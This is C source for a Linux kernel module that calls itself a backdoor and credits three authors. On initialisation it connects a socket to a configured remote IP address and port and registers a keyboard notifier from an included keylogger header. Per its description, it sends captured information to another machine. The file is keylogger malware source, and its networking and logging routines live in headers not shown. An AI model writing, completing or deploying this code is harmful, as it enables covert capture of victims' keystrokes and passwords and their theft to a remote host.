#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>
#include <linux/delay.h>

#include "networking.h"
#include "keyboardLogger.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Gabriel Franceschi Libardi");
MODULE_AUTHOR("Gustavo Moura Scarenci");
MODULE_AUTHOR("Artur Brenner Weber");
MODULE_DESCRIPTION("A module that sends kernel information via socket to another machine");
MODULE_VERSION("0.1");

static int __init backdoor_module_init(void) {
    int result;

    result = create_socket(IP_ADDRESS, PORT);
    if (result < 0) {
        printk(KERN_ERR "Failed to connect\n");
        return result;
    }

    // Register the keyboard notifier
    result = register_keyboard_notifier(&keyboard_notifier_block);
    if (result != 0) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return result;
    }

    printk(KERN_INFO "Backdoor module initialized\n");
    return 0;
}

static void __exit backdoor_module_exit(void) {
    int ret;
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier_block);
    ret = shutdown_socket();

    if (ret < 0) {
	printk(KERN_ERR "Unable to release socket");
	return;
    }
    printk(KERN_INFO "Backdoor module exited\n");
}

module_init(backdoor_module_init);
module_exit(backdoor_module_exit);
